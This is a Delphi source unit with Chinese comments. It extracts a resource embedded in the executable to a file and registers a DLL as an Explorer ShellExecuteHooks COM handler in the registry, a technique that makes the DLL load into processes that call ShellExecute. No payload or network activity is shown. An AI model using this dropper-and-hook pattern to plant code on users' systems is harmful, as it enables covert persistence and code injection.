unit FunUnit;

interface

function ResourceToFile(const ResType, ResName, FileName: PChar): Boolean; // 释放资源到文件
procedure SetupShellHook(const ComDLL_FileName: PChar); // 添加Url执行挂钩

implementation

uses Windows;
  
  // 释放资源到文件       
function ResourceToFile(const ResType, ResName, FileName: PChar): Boolean;
var
  HResource, HGlobal, HFile: THandle;
  FSize, WSize: DWORD;
  FMemory: Pointer;
begin
  Result := FALSE;
  
 // 定位资源
  HResource := FindResource(HInstance, ResName, ResType);
  if (HResource = 0) then Exit;

 // 装入资源
  HGlobal := LoadResource(HInstance, HResource);
  if (HGlobal = 0) then Exit;

 // 锁定内存
  FMemory := LockResource(HGlobal);
  if (FMemory = nil) then
  begin
    FreeResource(HGlobal);
    Exit;
  end;

 // 建立文件
  HFile := CreateFile(FileName, GENERIC_WRITE, 0, nil, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, 0);
  if (HFile = INVALID_HANDLE_VALUE) then
  begin
    UnlockResource(HGlobal);
    FreeResource(HGlobal);
    Exit;
  end;

 // 写入文件
  FSize := SizeOfResource(HInstance, HResource);
  WriteFile(HFile, FMemory^, FSize, Wsize, nil);
  if (FSize <> Wsize) then
  begin
    UnlockResource(HGlobal);  
    FreeResource(HGlobal);
    Exit;
  end;

 // 关闭保存
  SetEndofFile(HFile);
  CloseHandle(HFile);
  
 // 解锁释放
  UnlockResource(HGlobal);
  FreeResource(HGlobal);

  Result := TRUE;  
end;  

  // 添加Url执行挂钩    
procedure SetupShellHook(const ComDLL_FileName: PChar);
    // 返回字符串长度
  function StrLen(const Str: PChar): Cardinal; assembler;
  asm
        MOV     EDX,EDI
        MOV     EDI,EAX
        MOV     ECX,0FFFFFFFFH
        XOR     AL,AL
        REPNE   SCASB
        MOV     EAX,0FFFFFFFEH
        SUB     EAX,ECX
        MOV     EDI,EDX
  end;
    // 添加注册表项目
  procedure AddStrToReg(RootKey: HKEY; const StrPath, StrName, StrData: PChar);
  var
    TempKey: HKEY;
    Disposition, DataSize: LongWord;
  begin
   // 打开
    TempKey := 0;
    Disposition := REG_CREATED_NEW_KEY;
    RegCreateKeyEx(RootKey, StrPath, 0, nil, 0, KEY_ALL_ACCESS, nil, TempKey, @Disposition);

   // 添加
    DataSize := StrLen(StrData) + 1;
    RegSetValueEx(TempKey, StrName, 0, REG_SZ, StrData, DataSize);
    
   // 关闭
    RegCloseKey(TempKey);
  end;
const
  HookName = '{5EED7056-B89D-4DE8-A060-D285EA746799}';
  HookPath = 'SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\ShellExecuteHooks';
var
  TempStr: string;
begin
 // 添加对象
  TempStr := 'CLSID\' + HookName;
  AddStrToReg(HKEY_CLASSES_ROOT, @TempStr[1], '', 'URL 执行挂钩    By 麻子');

 // 设置属性 
  TempStr := TempStr + '\InProcServer32';
  AddStrToReg(HKEY_CLASSES_ROOT, @TempStr[1], '', ComDLL_FileName);
  AddStrToReg(HKEY_CLASSES_ROOT, @TempStr[1], 'ThreadingModel', 'Apartment');

 // 添加Hook
  AddStrToReg(HKEY_LOCAL_MACHINE, HookPath, HookName, '');
end;

end.
